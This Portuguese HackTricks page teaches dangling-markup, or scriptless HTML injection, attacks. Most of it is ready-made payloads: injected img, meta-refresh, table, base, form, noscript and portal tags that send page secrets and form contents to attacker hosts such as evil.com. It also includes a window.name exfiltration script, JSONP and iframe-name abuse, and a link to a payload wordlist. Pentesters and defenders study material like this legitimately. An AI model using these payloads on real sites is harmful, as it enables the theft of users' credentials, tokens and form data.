# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## Resumo

Esta técnica pode ser usada para extrair informações de um usuário quando uma **injeção de HTML é encontrada**. Isso é muito útil se você **não encontrar nenhuma maneira de explorar um** [**XSS** ](../xss-cross-site-scripting/) mas você pode **injetar algumas tags HTML**.\
Também é útil se algum **segredo estiver salvo em texto claro** no HTML e você quiser **exfiltrá-lo** do cliente, ou se você quiser enganar alguma execução de script.

Várias técnicas comentadas aqui podem ser usadas para contornar algumas [**Content Security Policy**](../content-security-policy-csp-bypass/) exfiltrando informações de maneiras inesperadas (tags html, CSS, tags http-meta, formulários, base...).

## Principais Aplicações

### Roubo de segredos em texto claro

Se você injetar `<img src='http://evil.com/log.cgi?` quando a página for carregada, a vítima enviará todo o código entre a tag `img` injetada e a próxima aspa dentro do código. Se um segredo estiver de alguma forma localizado naquele trecho, você o roubará (você pode fazer a mesma coisa usando uma aspa dupla, veja qual poderia ser mais interessante usar).

Se a tag `img` for proibida (devido ao CSP, por exemplo), você também pode usar `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Observe que **o Chrome bloqueia URLs HTTP** com "<" ou "\n" nelas, então você pode tentar outros esquemas de protocolo como "ftp".

Você também pode abusar do CSS `@import` (enviará todo o código até encontrar um ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Você também pode usar **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Você também pode inserir uma `<base` tag. Todas as informações serão enviadas até que a citação seja fechada, mas isso requer alguma interação do usuário (o usuário deve clicar em algum link, porque a tag base terá mudado o domínio apontado pelo link):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Roubo de formulários
```html
<base href="http://evil.com/" />
```
Então, os formulários que enviam dados para o caminho (como `<form action='update_profile.php'>`) enviarão os dados para o domínio malicioso.

### Roubo de formulários 2

Defina um cabeçalho de formulário: `<form action='http://evil.com/log_steal'>` isso irá sobrescrever o próximo cabeçalho de formulário e todos os dados do formulário serão enviados para o atacante.

### Roubo de formulários 3

O botão pode mudar a URL para onde as informações do formulário serão enviadas com o atributo "formaction":
```html
<button name="xss" type="submit" formaction="https://google.com">
I get consumed!
</button>
```
Um atacante pode usar isso para roubar as informações.

Encontre um [**exemplo deste ataque neste relatório**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Roubo de segredos em texto claro 2

Usando a técnica mencionada mais recente para roubar formulários (injetando um novo cabeçalho de formulário), você pode então injetar um novo campo de entrada:
```html
<input type='hidden' name='review_body' value="
```
e este campo de entrada conterá todo o conteúdo entre suas aspas duplas e a próxima aspas dupla no HTML. Este ataque mistura "_**Roubo de segredos em texto claro**_" com "_**Roubo de forms2**_".

Você pode fazer a mesma coisa injetando um formulário e uma tag `<option>`. Todos os dados até que um `</option>` fechado seja encontrado serão enviados:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injeção de parâmetro de formulário

Você pode alterar o caminho de um formulário e inserir novos valores para que uma ação inesperada seja executada:
```html
<form action="/change_settings.php">
<input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

<form action="/change_settings.php">
← Existing form (ignored by the parser) ...
<input type="text" name="invite_user" value="" /> ← Subverted field ...
<input type="hidden" name="xsrf_token" value="12345" />
...
</form>
</form>
```
### Roubo de segredos em texto claro via noscript

`<noscript></noscript>` É uma tag cujo conteúdo será interpretado se o navegador não suportar javascript (você pode ativar/desativar Javascript no Chrome em [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Uma maneira de exfiltrar o conteúdo da página da web do ponto de injeção até o fundo para um site controlado pelo atacante será injetar isto:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassando CSP com interação do usuário

A partir desta [pesquisa do portswigger](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), você pode aprender que mesmo em ambientes **mais restritos pelo CSP**, ainda é possível **exfiltrar dados** com alguma **interação do usuário**. Nesta ocasião, vamos usar o payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Observe que você pedirá à **vítima** para **clicar em um link** que a **redirecionará** para um **payload** controlado por você. Também note que o atributo **`target`** dentro da tag **`base`** conterá **conteúdo HTML** até a próxima aspa simples.\
Isso fará com que o **valor** de **`window.name`** se o link for clicado seja todo aquele **conteúdo HTML**. Portanto, como você **controla a página** onde a vítima está acessando ao clicar no link, você pode acessar esse **`window.name`** e **exfiltrar** esses dados:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Fluxo de script enganoso 1 - Ataque de namespace HTML

Insira uma nova tag com um id dentro do HTML que irá sobrescrever a próxima e com um valor que afetará o fluxo de um script. Neste exemplo, você está selecionando com quem uma informação será compartilhada:
```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```
### Fluxo de script enganoso 2 - Ataque de namespace de script

Crie variáveis dentro do namespace javascript inserindo tags HTML. Então, essa variável afetará o fluxo da aplicação:
```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```
### Abuso de JSONP

Se você encontrar uma interface JSONP, poderá chamar uma função arbitrária com dados arbitrários:
```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
Ou você pode até tentar executar algum javascript:
```html
<script src="/search?q=a&call=alert(1)"></script>
```
### Abuso de Iframe

Um documento filho possui a capacidade de visualizar e modificar a propriedade `location` de seu pai, mesmo em situações de origem cruzada. Isso permite a incorporação de um script dentro de um **iframe** que pode redirecionar o cliente para uma página arbitrária:
```html
<html>
<head></head>
<body>
<script>
top.window.location = "https://attacker.com/hacked.html"
</script>
</body>
</html>
```
Isso pode ser mitigado com algo como: `sandbox=' allow-scripts allow-top-navigation'`

Um iframe também pode ser abusado para vazar informações sensíveis de uma página diferente **usando o atributo name do iframe**. Isso ocorre porque você pode criar um iframe que se iframe a si mesmo abusando da injeção HTML que faz com que as **informações sensíveis apareçam dentro do atributo name do iframe** e, em seguida, acessar esse nome a partir do iframe inicial e vazá-lo.
```html
<script>
function cspBypass(win) {
win[0].location = "about:blank"
setTimeout(() => alert(win[0].name), 500)
}
</script>

<iframe
src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
onload="cspBypass(this.contentWindow)"></iframe>
```
Para mais informações, consulte [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuse

Você pode usar **`meta http-equiv`** para realizar **várias ações** como definir um Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou realizar um redirecionamento (em 5s neste caso): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Isso pode ser **evitado** com um **CSP** em relação ao **http-equiv** ( `Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Novo \<portal HTML tag

Você pode encontrar uma pesquisa muito **interessante** sobre vulnerabilidades exploráveis do \<portal tag [aqui](https://research.securitum.com/security-analysis-of-portal-element/).\
No momento da escrita, você precisa habilitar a tag portal no Chrome em `chrome://flags/#enable-portals` ou não funcionará.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

Nem todas as maneiras de vazar conectividade em HTML serão úteis para Dangling Markup, mas às vezes podem ajudar. Confira aqui: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

Isso é uma **mistura** entre **dangling markup e XS-Leaks**. De um lado, a vulnerabilidade permite **injetar HTML** (mas não JS) em uma página da **mesma origem** da que estaremos atacando. Do outro lado, não iremos **atacar** diretamente a página onde podemos injetar HTML, mas **outra página**.

{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Search/XS-Leaks

XS-Search é orientado a **exfiltrar informações de origem cruzada** abusando de **ataques de canal lateral**. Portanto, é uma técnica diferente de Dangling Markup, no entanto, algumas das técnicas abusam da inclusão de tags HTML (com e sem execução de JS), como [**CSS Injection**](../xs-search/#css-injection) ou [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{{#ref}}
../xs-search/
{{#endref}}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

- [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
- [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{{#include ../../banners/hacktricks-training.md}}
